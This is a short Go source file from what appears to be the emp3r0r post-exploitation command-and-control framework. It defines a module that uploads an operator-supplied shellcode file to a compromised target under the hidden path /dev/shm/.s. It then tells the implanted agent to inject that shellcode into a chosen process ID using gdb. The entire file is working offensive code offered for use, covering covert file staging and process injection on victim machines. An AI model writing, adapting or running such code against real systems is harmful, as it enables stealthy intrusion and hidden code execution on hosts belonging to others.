package cc

import "github.com/jm33-m0/emp3r0r/core/internal/agent"

func moduleInjector() {
	// target
	target := CurrentTarget
	if target == nil {
		CliPrintError("Target not exist")
		return
	}

	// upload shellcode.txt
	shellcode_file := Options["shellcode_file"].Val
	pid := Options["pid"].Val
	if !agent.IsFileExist(shellcode_file) {
		CliPrintError("%s does not exist", shellcode_file)
		return
	}
	err := PutFile(shellcode_file, "/dev/shm/.s", target)
	if err != nil {
		CliPrintError("Could not upload shellcode file (%s): %v", shellcode_file, err)
		return
	}

	// tell agent to inject this shellcode
	err = SendCmd("!inject gdb /dev/shm/.s "+pid, target)
	if err != nil {
		CliPrintError("Could not send command to agent: %v", err)
		return
	}
	CliPrintInfo("Please wait...")
}
